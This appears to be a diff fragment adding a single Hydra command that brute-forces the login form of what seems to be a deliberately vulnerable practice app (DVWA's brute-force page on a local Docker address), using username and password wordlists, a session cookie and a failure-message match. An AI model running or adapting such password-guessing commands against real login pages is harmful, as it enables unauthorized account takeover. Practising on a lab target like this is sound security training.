@@ -1,0 +1,4 @@
+hydra -L usernames.txt -P passwords.txt ’http-get-form://172.17.0.2/
+vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:
+H=Cookie\:PHPSESSID=nufkgpjrqjhkjtopigdbhd3l37; security=low:
+F=Username and/or password incorrect’
